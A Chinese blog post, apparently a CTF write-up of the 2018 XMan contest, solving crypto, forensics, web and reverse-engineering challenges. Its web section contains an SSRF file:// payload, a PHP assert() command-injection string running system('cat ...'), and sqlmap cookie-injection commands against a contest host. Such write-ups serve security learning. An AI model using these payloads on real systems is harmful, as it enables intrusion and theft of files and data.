<!DOCTYPE html>
<html lang="en">





<head><meta name="generator" content="Hexo 3.8.0">
  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/apple-touch-icon.png">
  <link rel="icon" type="image/png" href="/img/favicon.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#005f6b">
  <meta name="description" content="Software Security Researcher">
  <meta name="author" content>
  <meta name="keywords" content>
  <title>2018-XMan个人排位赛 - AssassinQ</title>

  <link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css">
<link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css">
<link rel="stylesheet" href="https://cdn.staticfile.org/mdbootstrap/4.13.0/css/mdb.min.css">
<link rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/3.0.1/github-markdown.min.css">
<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">


  <link rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css">

<link rel="stylesheet" href="/css/main.css">


  <link defer rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css">


<!-- 自定义样式保持在最底部 -->


<link rel="alternate" href="/atom.xml" title="AssassinQ" type="application/atom+xml"><!-- hexo-inject:begin --><!-- hexo-inject:end -->
</head>


<body>
  <!-- hexo-inject:begin --><!-- hexo-inject:end --><header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">&nbsp;<strong>AssassinQ</strong>&nbsp;</a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/">Home</a>
          </li>
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/archives/">Archives</a>
          </li>
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/tags/">Tags</a>
          </li>
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/about/">About</a>
          </li>
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/links/">Links</a>
          </li>
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="view intro-2" id="background" parallax=true
         style="background: url('/img/default.png') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask rgba-black-light flex-center">
          <div class="container text-center white-text fadeInUp">
            <span class="h2" id="subtitle">
              
            </span>

            
              
                <p class="mt-3 post-meta">
                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>
                  Saturday, August 11th 2018, 8:18 pm
                </p>
              

              <p class="mt-1">
                
                  
                  <span class="post-meta">
                    <i class="far fa-chart-bar"></i>
                    6.1k 字
                  </span>
                

                
                  
                  <span class="post-meta">
                      <i class="far fa-clock"></i>
                      36 分钟
                  </span>
                

                
              </p>
            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid">
  <div class="row">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-md">
      <div class="container nopadding-md" id="board-ctn">
        <div class="py-5 z-depth-3" id="board">
          <div class="post-content mx-auto" id="post">
            
            <div class="markdown-body">
              <p>唉 pwn 还是没有入门。</p>
<a id="more"></a>
<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="FILE"><a href="#FILE" class="headerlink" title="FILE"></a>FILE</h2><p>用 <code>DiskGenius</code> 恢复磁盘：</p>
<p><img src="/pics/2018-XMan个人排位赛/1.png" srcset="/img/loading.gif" alt></p>
<h2 id="XMAN-通行证"><a href="#XMAN-通行证" class="headerlink" title="XMAN 通行证"></a>XMAN 通行证</h2><p>不同的网站解密结果竟然不一样。最后发现这个<a href="http://ctf.ssleye.com/" target="_blank" rel="noopener">网站</a>还行。</p>
<pre><code>a2FuYmJyZ2doamx7emJfX19ffXZ0bGFsbg==
</code></pre><p>第一眼就知道先是 base64：</p>
<pre><code>kanbbrgghjl{zb____}vtlaln
</code></pre><p>栅栏 7 栏加密：</p>
<pre><code>kzna{blnl_abj_lbh_trg_vg}
</code></pre><p>凯撒位移 13 位得到 flag：</p>
<pre><code>xman{oyay_now_you_get_it}
</code></pre><h2 id="PPAP"><a href="#PPAP" class="headerlink" title="PPAP"></a>PPAP</h2><p>用 wireshark 打开，搜索关键字 flag，很容易找到一串 base64：</p>
<p><img src="/pics/2018-XMan个人排位赛/2.png" srcset="/img/loading.gif" alt></p>
<p>经过分析以后，具体结构应该是这样的：</p>
<pre><code>yaaaaaaaar, land ho!
    Hey wesley, you got that flag?
Ayy, I got yer files right here, matey!

            [base64&#39;d jpg]
            [base64&#39;d flag.zip]

And here be the map to the booty!

            [base64&#39;d Haar cascade]

    I don&#39;t understand, this isn&#39;t even a ma-
Yarrrr, the booty be buried by that which the map points to! (no spaces and no caps)
Ayy, now I be off. But remember, the factor of scales be 1.02, and the neighborly sorts be limited to 50!
Lastly, if ye sail the seven seas, you do be a pirate!
</code></pre><p>jpg 文件和 zip 文件之间通过等号判断分隔。通过 python 得到三个文件：</p>
<pre><code class="python"># example
import base64
f1 = open(&#39;b1&#39;, &#39;r&#39;)
enc1 = f1.read()
f2 = open(&#39;b1.jpg&#39;, &#39;w&#39;)
out = base64.b64decode(enc1)
f2.write(out)
f1.close()
f2.close()
</code></pre>
<p><img src="/pics/2018-XMan个人排位赛/3.png" srcset="/img/loading.gif" alt></p>
<p>然后又通过 binwalk 发现，这里输出的 jpg 图片其实不止一张。用 foremost 输出所有的图片。</p>
<p>下面用了官方的脚本，用 opencv 找出数百张图片的其中一张来得到密码：</p>
<pre><code class="python">import os
import sys
import cv2

# Get all of the pictures
imgs = os.listdir(&#39;jpg&#39;)

# Cascade we&#39;ll be using for detection
cascade = cv2.CascadeClassifier(&#39;b3.xml&#39;)

# From the clues
scaling_factor = 1.02
min_neighbors = 10  # Bumped this up until one pic was left

for img_name in imgs:
    # Load the image and run the cascade
    img = cv2.imread(os.path.join(&#39;jpg&#39;, img_name))
    detect = cascade.detectMultiScale(img, scaling_factor, min_neighbors)
    if len(detect) &gt; 0:
        for (x, y, w, h) in detect:
            # X marks the spot!
            cv2.line(img, (x, y),     (x + w, y + h), (255, 0, 0), 2)
            cv2.line(img, (x, y + h), (x + w, y),     (255, 0, 0), 2)
        # Save the new image
        cv2.imwrite(os.path.join(&#39;detected&#39;, img_name), img)
</code></pre>
<p>最后得到一张海盗的图片，容易知道密码应该是 skullandcrossbones，得到 flag。</p>
<h2 id="AUTOKEY"><a href="#AUTOKEY" class="headerlink" title="AUTOKEY"></a>AUTOKEY</h2><p>一个 pcap 包，都是 usb 流量，通过 <code>tshark</code> 提取出来：</p>
<pre><code class="shell"> ⚡ root@kali  ~/Desktop  tshark -r task_AutoKey.pcapng -T fields -e usb.capdata &gt; usbdata.txt
Running as user &quot;root&quot; and group &quot;root&quot;. This could be dangerous.
</code></pre>
<p>查看后发现都是八个字节的数据，那么应该是键盘流量，用脚本跑出来：</p>
<pre><code class="python">#!usr/bin/env python
#-*- coding:utf-8 -*-

mappings = { 0x04:&quot;A&quot;,  0x05:&quot;B&quot;,  0x06:&quot;C&quot;, 0x07:&quot;D&quot;, 0x08:&quot;E&quot;, 0x09:&quot;F&quot;, 0x0A:&quot;G&quot;,  0x0B:&quot;H&quot;, 0x0C:&quot;I&quot;,  0x0D:&quot;J&quot;, 0x0E:&quot;K&quot;, 0x0F:&quot;L&quot;, 0x10:&quot;M&quot;, 0x11:&quot;N&quot;,0x12:&quot;O&quot;,  0x13:&quot;P&quot;, 0x14:&quot;Q&quot;, 0x15:&quot;R&quot;, 0x16:&quot;S&quot;, 0x17:&quot;T&quot;, 0x18:&quot;U&quot;,0x19:&quot;V&quot;, 0x1A:&quot;W&quot;, 0x1B:&quot;X&quot;, 0x1C:&quot;Y&quot;, 0x1D:&quot;Z&quot;, 0x1E:&quot;1&quot;, 0x1F:&quot;2&quot;, 0x20:&quot;3&quot;, 0x21:&quot;4&quot;, 0x22:&quot;5&quot;,  0x23:&quot;6&quot;, 0x24:&quot;7&quot;, 0x25:&quot;8&quot;, 0x26:&quot;9&quot;, 0x27:&quot;0&quot;, 0x28:&quot;\n&quot;, 0x2a:&quot;[DEL]&quot;,  0X2B:&quot;    &quot;, 0x2C:&quot; &quot;,  0x2D:&quot;-&quot;, 0x2E:&quot;=&quot;, 0x2F:&quot;[&quot;,  0x30:&quot;]&quot;,  0x31:&quot;\\&quot;, 0x32:&quot;~&quot;, 0x33:&quot;;&quot;,  0x34:&quot;&#39;&quot;, 0x36:&quot;,&quot;,  0x37:&quot;.&quot; }
nums = []
keys = open(&#39;usbdata.txt&#39;)
for line in keys:
    if line[0]!=&#39;0&#39; or line[1]!=&#39;0&#39; or line[3]!=&#39;0&#39; or line[4]!=&#39;0&#39; or line[9]!=&#39;0&#39; or line[10]!=&#39;0&#39; or line[12]!=&#39;0&#39; or line[13]!=&#39;0&#39; or line[15]!=&#39;0&#39; or line[16]!=&#39;0&#39; or line[18]!=&#39;0&#39; or line[19]!=&#39;0&#39; or line[21]!=&#39;0&#39; or line[22]!=&#39;0&#39;:
         continue
    nums.append(int(line[6:8],16))
keys.close()
output = &quot;&quot;
for n in nums:
    if n == 0 :
        continue
    if n in mappings:
        output += mappings[n]
    else:
        output += &#39;[unknown]&#39;
print &#39;output :\n&#39; + output
</code></pre>
<p>出来的结果：</p>
<pre><code>output :
[unknown]A[unknown]UTOKEY&#39;&#39;.DECIPHER&#39;[unknown]MPLRVFFCZEYOUJFJKYBXGZVDGQAURKXZOLKOLVTUFBLRNJESQITWAHXNSIJXPNMPLSHCJBTYHZEALOGVIAAISSPLFHLFSWFEHJNCRWHTINSMAMBVEXO[DEL]PZE[DEL]IZ&#39;
</code></pre><p>去掉 <code>[uuknown]</code>，<code>[DEL]</code> 则是去掉后一个字符，得到：</p>
<pre><code>output :
AUTOKEY&#39;&#39;.DECIPHER&#39;MPLRVFFCZEYOUJFJKYBXGZVDGQAURKXZOLKOLVTUFBLRNJESQITWAHXNSIJXPNMPLSHCJBTYHZEALOGVIAAISSPLFHLFSWFEHJNCRWHTINSMAMBVEXOZEZ&#39;
</code></pre><p>百度一下 autokey，用 github 上找到的的<a href="https://github.com/Ezran/crypto/blob/master/break_autokey/break_autokey.py" target="_blank" rel="noopener">爆破脚本</a>得到 flag。</p>
<p><img src="/pics/2018-XMan个人排位赛/4.png" srcset="/img/loading.gif" alt></p>
<pre><code>-676.914569565 autokey, klen 8 :&quot;FLAGHERE&quot;, HELLOBOYSANDGIRLSYOUARESOSMARTTHATYOUCANFINDTHEFLAGTHATIHIDEINTHEKEYBOARDPACKAGEFLAGISJHAWLZKEWXHNCDHSLWBAQJTUQZDXYQLF

HELLO BOYS AND GIRLS YOU ARE SO SMART THAT YOU CAN FIND THE FLAG THAT I HIDE IN THE KEYBOARD PACKAGE FLAG IS JHAWLZKEWXHNCDHSLWBAQJTUQZDXYQLF
</code></pre><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="SIMPLE-SSRF"><a href="#SIMPLE-SSRF" class="headerlink" title="SIMPLE SSRF"></a>SIMPLE SSRF</h2><p>hint 里提示 <code>curl</code> 还有 <code>flag在/etc/flag.txt</code>，大概是通过 file 协议读取本地文件。payload：</p>
<pre><code>file://www.baidu.com/etc/flag.txt#
</code></pre><h2 id="MAKEIT"><a href="#MAKEIT" class="headerlink" title="MAKEIT"></a>MAKEIT</h2><p>网页上提示了 git，猜测存在 <code>.git</code> 文件泄露，把源码下载下来之后审计：</p>
<pre><code class="php">&lt;?php

if (isset($_GET[&#39;page&#39;])) {
    $page = $_GET[&#39;page&#39;];
} else {
    $page = &quot;home&quot;;
}

$file = &quot;templates/&quot; . $page . &quot;.php&quot;;

// I heard &#39;..&#39; is dangerous!
assert(&quot;strpos(&#39;$file&#39;, &#39;..&#39;) === false&quot;) or die(&quot;Detected hacking attempt!&quot;);

// TODO: Make this look nice
assert(&quot;file_exists(&#39;$file&#39;)&quot;) or die(&quot;That file doesn&#39;t exist!&quot;);

?&gt;
</code></pre>
<p>这里有 <code>assert()</code>，可以执行函数中的命令，通过构造闭合前面的 <code>strpos()</code> 绕过，来得到 <code>templates/flag.php</code> 中的内容：</p>
<pre><code>1&#39;, &#39;..&#39;) or system(&#39;cat templates/flag.php&#39;); //
</code></pre><h2 id="BBSQLI"><a href="#BBSQLI" class="headerlink" title="BBSQLI"></a>BBSQLI</h2><p>cookie 注入，PHPSESSID 拿下来：</p>
<p><img src="/pics/2018-XMan个人排位赛/5.png" srcset="/img/loading.gif" alt></p>
<p>用 sqlmap 跑：</p>
<pre><code class="shell">// 跑表名
python sqlmap.py -u http://202.112.51.184:16080/ --cookie &quot;PHPSESSID=0f3f8f5bcd396b7d83ea2799a77aea49&quot; --table --level 2
// 跑列名
python sqlmap.py -u http://202.112.51.184:16080/ --cookie &quot;PHPSESSID=0f3f8f5bcd396b7d83ea2799a77aea49&quot; --columns -T &#39;[GDJM_flag]&#39; --level 2
// 跑flag
python sqlmap.py -u http://202.112.51.184:16080/ --cookie &quot;PHPSESSID=0f3f8f5bcd396b7d83ea2799a77aea49&quot; --dump -T &#39;[GDJM_flag]&#39; -C &#39;flag&#39; --level 2
</code></pre>
<p>PS：不同的 level 等级，SQLMAP 所采用的策略也不近相同，当–level 的参数设定为 2 或者 2 以上的时候，sqlmap 会尝试注入 Cookie 参数；当–level 参数设定为 3 或者 3 以上的时候，会尝试对 User-Angent，referer 进行注入。</p>
<h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="DRAGON-QUEST"><a href="#DRAGON-QUEST" class="headerlink" title="DRAGON QUEST"></a>DRAGON QUEST</h2><p>和 csaw 的那道 wyvern 很像，可以用 angr 跑出来：</p>
<pre><code class="python">#!/usr/bin/env python
import angr
import claripy

p = angr.Project(&#39;task_xman1&#39;)
flag_chars = [claripy.BVS(&#39;flag_%d&#39; % i, 8) for i in range(28)] # flag&#39;s length is 28, every char is 8 bit
flag = claripy.Concat(*flag_chars + [claripy.BVV(b&#39;\n&#39;)]) # end with &#39;\n&#39;

st = p.factory.full_init_state(
        args=[&#39;./xman_task1&#39;], # arguments
        add_options=angr.options.unicorn,
        stdin=flag, # flag as input
)

for k in flag_chars:
    st.solver.add(k != 0) # char is not 0
    st.solver.add(k != 10) # char is not &#39;\n&#39;

sm = p.factory.simulation_manager(st)
sm.run()

out = b&#39;&#39;
for pp in sm.deadended:
    out = pp.posix.dumps(1)
    if b&#39;flag{&#39; in out:
        out = next(filter(lambda s: b&#39;flag{&#39; in s, out.split()))
        break
print(&#39;flag:&#39;, out)
</code></pre>
<p>pizza 大佬提供了另一种思路。先用 ida-python 去混淆：</p>
<pre><code class="python">import ida_xref
import ida_idaapi
from ida_bytes import get_bytes, patch_bytes

def do_patch(ea):
    if(get_bytes(ea, 1) == &quot;\x8B&quot;): # mov eax-edi, dword
        reg = (ord(get_bytes(ea + 1, 1)) &amp; 0b00111000) &gt;&gt; 3
        patch_bytes(ea, chr(0xB8 + reg) + &quot;\x00\x00\x00\x00\x90\x90&quot;)
    elif(get_bytes(ea, 2) == &quot;\x44\x8B&quot;): # mov r8d-r15d, dword
        reg = (ord(get_bytes(ea + 2, 1)) &amp; 0b00111000) &gt;&gt; 3
        patch_bytes(ea + 1, chr(0xB8 + reg) + &quot;\x00\x00\x00\x00\x90\x90&quot;)

for addr in xrange(0x610318, 0x6105AC, 4):
    ref = ida_xref.get_first_dref_to(addr)
    print(hex(addr).center(20,&quot;-&quot;))
    while(ref != ida_idaapi.BADADDR):
        do_patch(ref)
        print(&quot;patch at &quot; + hex(ref))
        ref = ida_xref.get_next_dref_to(addr, ref)
    print(&quot;-&quot;*20)
</code></pre>
<p>最后脚本：</p>
<pre><code class="python">secret = [100, 214, 266, 369, 417, 527, 622, 733, 847, 942, 1054, 1106, 1222, 1336, 1441, 1540, 1589, 1686, 1796, 1891, 1996, 2112, 2165, 2260, 2336, 2412, 2498, 2575]
n = 0
flag = &quot;&quot;
for i in xrange(0, len(secret)):
    ch = secret[i] - n
    n += ch
    flag += chr(ch)
print(flag)
</code></pre>
<h2 id="EASYWASM"><a href="#EASYWASM" class="headerlink" title="EASYWASM"></a>EASYWASM</h2><p>github 上找到一个<a href="https://github.com/WebAssembly/wabt" target="_blank" rel="noopener">将 wasm 转成 c 的工具</a>。命令：<code>wasm2c easywasm.wasm -o easywasm.c</code></p>
<p>大概内容：</p>
<pre><code class="cpp">...

static void init_globals(void) {
  g2 = 0u;
  g3 = 0u;
  _flag_enc = 0u;
  _k = 1104u;
  _r = 1360u;
}

...

static void _md5(u32 p0, u32 p1, u32 p2) {
  ...
}

static u32 _check(u32 p0) {
  ...
}

...

static void init_memory(void) {
  memcpy(&amp;((*Z_envZ_memory).data[(*Z_envZ_memoryBaseZ_i)]), data_segment_data_0, 1648);
}

static void init_table(void) {
  ...
}

static void init_exports(void) {
  ...
}

void WASM_RT_ADD_PREFIX(init)(void) {
  init_func_types();
  init_globals();
  init_memory();
  init_table();
  init_exports();
}
</code></pre>
<p>转换成 c 代码后，审计起来还是很累。硬逆出来：</p>
<pre><code class="python">#!/usr/bin/env python
import hashlib
data = [0x35, 0x36, 0x32, 0x66, 0x65, 0x33, 0x63, 0x63, 0x35, 0x30, 0x30, 0x31,
  0x34, 0x63, 0x32, 0x36, 0x30, 0x64, 0x39, 0x65, 0x38, 0x63, 0x66, 0x34,
  0x65, 0x64, 0x33, 0x38, 0x63, 0x37, 0x37, 0x61, 0x00, 0x63, 0x30, 0x32,
  0x32, 0x61, 0x64, 0x30, 0x63, 0x63, 0x30, 0x30, 0x37, 0x35, 0x61, 0x39,
  0x61, 0x62, 0x31, 0x34, 0x62, 0x34, 0x31, 0x32, 0x61, 0x31, 0x30, 0x38,
  0x32, 0x64, 0x35, 0x66, 0x33, 0x00, 0x36, 0x34, 0x63, 0x32, 0x38, 0x36,
  0x63, 0x66, 0x63, 0x36, 0x32, 0x33, 0x61, 0x61, 0x38, 0x64, 0x37, 0x64,
  0x66, 0x37, 0x63, 0x30, 0x38, 0x38, 0x65, 0x62, 0x66, 0x37, 0x64, 0x37,
  0x31, 0x38, 0x00, 0x38, 0x33, 0x36, 0x36, 0x34, 0x62, 0x64, 0x65, 0x65,
  0x34, 0x62, 0x36, 0x31, 0x33, 0x62, 0x37, 0x65, 0x37, 0x61, 0x35, 0x31,
  0x62, 0x35, 0x32, 0x31, 0x33, 0x34, 0x37, 0x30, 0x61, 0x38, 0x64, 0x00,
  0x62, 0x30, 0x32, 0x30, 0x62, 0x66, 0x35, 0x39, 0x38, 0x61, 0x61, 0x61,
  0x32, 0x62, 0x33, 0x65, 0x30, 0x33, 0x65, 0x64, 0x30, 0x32, 0x63, 0x38,
  0x35, 0x34, 0x33, 0x36, 0x32, 0x36, 0x38, 0x61, 0x00, 0x34, 0x66, 0x64,
  0x61, 0x63, 0x35, 0x61, 0x63, 0x38, 0x30, 0x37, 0x35, 0x30, 0x36, 0x39,
  0x33, 0x38, 0x31, 0x30, 0x33, 0x65, 0x37, 0x37, 0x35, 0x63, 0x35, 0x30,
  0x30, 0x39, 0x39, 0x65, 0x64, 0x00, 0x34, 0x66, 0x64, 0x61, 0x63, 0x35,
  0x61, 0x63, 0x38, 0x30, 0x37, 0x35, 0x30, 0x36, 0x39, 0x33, 0x38, 0x31,
  0x30, 0x33, 0x65, 0x37, 0x37, 0x35, 0x63, 0x35, 0x30, 0x30, 0x39, 0x39,
  0x65, 0x64, 0x00, 0x63, 0x32, 0x33, 0x31, 0x64, 0x36, 0x30, 0x37, 0x62,
  0x36, 0x38, 0x32, 0x33, 0x66, 0x64, 0x30, 0x61, 0x36, 0x38, 0x65, 0x38,
  0x31, 0x33, 0x37, 0x36, 0x30, 0x38, 0x30, 0x39, 0x37, 0x35, 0x34, 0x00,
  0x64, 0x31, 0x36, 0x38, 0x63, 0x32, 0x31, 0x64, 0x31, 0x30, 0x33, 0x37,
  0x31, 0x61, 0x35, 0x61, 0x62, 0x36, 0x31, 0x62, 0x63, 0x66, 0x65, 0x36,
  0x63, 0x37, 0x35, 0x39, 0x65, 0x66, 0x36, 0x65, 0x00, 0x66, 0x36, 0x30,
  0x64, 0x37, 0x30, 0x39, 0x63, 0x63, 0x66, 0x39, 0x38, 0x39, 0x64, 0x38,
  0x34, 0x39, 0x30, 0x32, 0x38, 0x66, 0x39, 0x37, 0x61, 0x30, 0x33, 0x64,
  0x32, 0x66, 0x33, 0x62, 0x61, 0x00, 0x61, 0x30, 0x31, 0x38, 0x34, 0x66,
  0x38, 0x32, 0x34, 0x30, 0x65, 0x32, 0x66, 0x65, 0x34, 0x36, 0x38, 0x36,
  0x31, 0x64, 0x63, 0x38, 0x64, 0x31, 0x35, 0x61, 0x38, 0x31, 0x39, 0x63,
  0x62, 0x30, 0x00, 0x39, 0x64, 0x62, 0x65, 0x63, 0x34, 0x31, 0x34, 0x33,
  0x33, 0x36, 0x65, 0x37, 0x34, 0x31, 0x65, 0x39, 0x63, 0x37, 0x33, 0x34,
  0x32, 0x32, 0x64, 0x66, 0x35, 0x39, 0x64, 0x65, 0x32, 0x39, 0x37, 0x00,
  0x36, 0x66, 0x62, 0x35, 0x32, 0x30, 0x39, 0x64, 0x38, 0x66, 0x63, 0x38,
  0x62, 0x62, 0x38, 0x35, 0x30, 0x37, 0x32, 0x34, 0x35, 0x62, 0x63, 0x66,
  0x61, 0x32, 0x34, 0x61, 0x65, 0x31, 0x31, 0x66, 0x00, 0x36, 0x66, 0x62,
  0x35, 0x32, 0x30, 0x39, 0x64, 0x38, 0x66, 0x63, 0x38, 0x62, 0x62, 0x38,
  0x35, 0x30, 0x37, 0x32, 0x34, 0x35, 0x62, 0x63, 0x66, 0x61, 0x32, 0x34,
  0x61, 0x65, 0x31, 0x31, 0x66, 0x00, 0x30, 0x30, 0x63, 0x37, 0x37, 0x66,
  0x62, 0x63, 0x36, 0x30, 0x61, 0x35, 0x62, 0x66, 0x63, 0x34, 0x36, 0x36,
  0x64, 0x33, 0x64, 0x30, 0x36, 0x39, 0x38, 0x37, 0x36, 0x65, 0x63, 0x33,
  0x34, 0x38, 0x00, 0x30, 0x30, 0x63, 0x37, 0x37, 0x66, 0x62, 0x63, 0x36,
  0x30, 0x61, 0x35, 0x62, 0x66, 0x63, 0x34, 0x36, 0x36, 0x64, 0x33, 0x64,
  0x30, 0x36, 0x39, 0x38, 0x37, 0x36, 0x65, 0x63, 0x33, 0x34, 0x38, 0x00,
  0x64, 0x66, 0x33, 0x33, 0x34, 0x36, 0x34, 0x66, 0x62, 0x34, 0x37, 0x31,
  0x63, 0x34, 0x36, 0x61, 0x62, 0x61, 0x66, 0x36, 0x39, 0x31, 0x63, 0x30,
  0x30, 0x30, 0x61, 0x30, 0x65, 0x33, 0x30, 0x64, 0x00, 0x34, 0x66, 0x64,
  0x61, 0x63, 0x35, 0x61, 0x63, 0x38, 0x30, 0x37, 0x35, 0x30, 0x36, 0x39,
  0x33, 0x38, 0x31, 0x30, 0x33, 0x65, 0x37, 0x37, 0x35, 0x63, 0x35, 0x30,
  0x30, 0x39, 0x39, 0x65, 0x64, 0x00, 0x66, 0x36, 0x30, 0x64, 0x37, 0x30,
  0x39, 0x63, 0x63, 0x66, 0x39, 0x38, 0x39, 0x64, 0x38, 0x34, 0x39, 0x30,
  0x32, 0x38, 0x66, 0x39, 0x37, 0x61, 0x30, 0x33, 0x64, 0x32, 0x66, 0x33,
  0x62, 0x61, 0x00, 0x66, 0x63, 0x63, 0x39, 0x34, 0x61, 0x32, 0x30, 0x35,
  0x39, 0x36, 0x66, 0x32, 0x36, 0x31, 0x39, 0x38, 0x36, 0x38, 0x66, 0x33,
  0x61, 0x34, 0x62, 0x66, 0x35, 0x32, 0x65, 0x61, 0x64, 0x66, 0x37, 0x00,
  0x30, 0x30, 0x63, 0x37, 0x37, 0x66, 0x62, 0x63, 0x36, 0x30, 0x61, 0x35,
  0x62, 0x66, 0x63, 0x34, 0x36, 0x36, 0x64, 0x33, 0x64, 0x30, 0x36, 0x39,
  0x38, 0x37, 0x36, 0x65, 0x63, 0x33, 0x34, 0x38, 0x00, 0x64, 0x31, 0x36,
  0x38, 0x63, 0x32, 0x31, 0x64, 0x31, 0x30, 0x33, 0x37, 0x31, 0x61, 0x35,
  0x61, 0x62, 0x36, 0x31, 0x62, 0x63, 0x66, 0x65, 0x36, 0x63, 0x37, 0x35,
  0x39, 0x65, 0x66, 0x36, 0x65, 0x00, 0x39, 0x64, 0x62, 0x65, 0x63, 0x34,
  0x31, 0x34, 0x33, 0x33, 0x36, 0x65, 0x37, 0x34, 0x31, 0x65, 0x39, 0x63,
  0x37, 0x33, 0x34, 0x32, 0x32, 0x64, 0x66, 0x35, 0x39, 0x64, 0x65, 0x32,
  0x39, 0x37, 0x00, 0x66, 0x63, 0x63, 0x39, 0x34, 0x61, 0x32, 0x30, 0x35,
  0x39, 0x36, 0x66, 0x32, 0x36, 0x31, 0x39, 0x38, 0x36, 0x38, 0x66, 0x33,
  0x61, 0x34, 0x62, 0x66, 0x35, 0x32, 0x65, 0x61, 0x64, 0x66, 0x37, 0x00,
  0x39, 0x62, 0x33, 0x37, 0x64, 0x62, 0x30, 0x39, 0x31, 0x39, 0x37, 0x39,
  0x62, 0x65, 0x64, 0x66, 0x30, 0x30, 0x61, 0x37, 0x30, 0x39, 0x35, 0x38,
  0x35, 0x31, 0x62, 0x61, 0x36, 0x66, 0x35, 0x39, 0x00, 0x30, 0x30, 0x63,
  0x37, 0x37, 0x66, 0x62, 0x63, 0x36, 0x30, 0x61, 0x35, 0x62, 0x66, 0x63,
  0x34, 0x36, 0x36, 0x64, 0x33, 0x64, 0x30, 0x36, 0x39, 0x38, 0x37, 0x36,
  0x65, 0x63, 0x33, 0x34, 0x38, 0x00, 0x66, 0x36, 0x30, 0x64, 0x37, 0x30,
  0x39, 0x63, 0x63, 0x66, 0x39, 0x38, 0x39, 0x64, 0x38, 0x34, 0x39, 0x30,
  0x32, 0x38, 0x66, 0x39, 0x37, 0x61, 0x30, 0x33, 0x64, 0x32, 0x66, 0x33,
  0x62, 0x61, 0x00, 0x66, 0x63, 0x63, 0x39, 0x34, 0x61, 0x32, 0x30, 0x35,
  0x39, 0x36, 0x66, 0x32, 0x36, 0x31, 0x39, 0x38, 0x36, 0x38, 0x66, 0x33,
  0x61, 0x34, 0x62, 0x66, 0x35, 0x32, 0x65, 0x61, 0x64, 0x66, 0x37, 0x00,
  0x64, 0x31, 0x36, 0x38, 0x63, 0x32, 0x31, 0x64, 0x31, 0x30, 0x33, 0x37,
  0x31, 0x61, 0x35, 0x61, 0x62, 0x36, 0x31, 0x62, 0x63, 0x66, 0x65, 0x36,
  0x63, 0x37, 0x35, 0x39, 0x65, 0x66, 0x36, 0x65, 0x00, 0x66, 0x36, 0x30,
  0x64, 0x37, 0x30, 0x39, 0x63, 0x63, 0x66, 0x39, 0x38, 0x39, 0x64, 0x38,
  0x34, 0x39, 0x30, 0x32, 0x38, 0x66, 0x39, 0x37, 0x61, 0x30, 0x33, 0x64,
  0x32, 0x66, 0x33, 0x62, 0x61, 0x00, 0x31, 0x38, 0x33, 0x33, 0x34, 0x32,
  0x39, 0x39, 0x37, 0x66, 0x66, 0x65, 0x64, 0x34, 0x62, 0x33, 0x31, 0x38,
  0x39, 0x65, 0x39, 0x37, 0x37, 0x64, 0x30, 0x37, 0x37, 0x61, 0x36, 0x30,
  0x62, 0x34, 0x00, 0x66, 0x34, 0x30, 0x34, 0x61, 0x33, 0x33, 0x36, 0x38,
  0x64, 0x32, 0x64, 0x38, 0x66, 0x35, 0x37, 0x34, 0x36, 0x34, 0x66, 0x37,
  0x33, 0x39, 0x64, 0x34, 0x65, 0x64, 0x30, 0x31, 0x63, 0x30, 0x65, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x78, 0xa4, 0x6a, 0xd7, 0x56, 0xb7, 0xc7, 0xe8, 0xdb, 0x70, 0x20, 0x24,
  0xee, 0xce, 0xbd, 0xc1, 0xaf, 0x0f, 0x7c, 0xf5, 0x2a, 0xc6, 0x87, 0x47,
  0x13, 0x46, 0x30, 0xa8, 0x01, 0x95, 0x46, 0xfd, 0xd8, 0x98, 0x80, 0x69,
  0xaf, 0xf7, 0x44, 0x8b, 0xb1, 0x5b, 0xff, 0xff, 0xbe, 0xd7, 0x5c, 0x89,
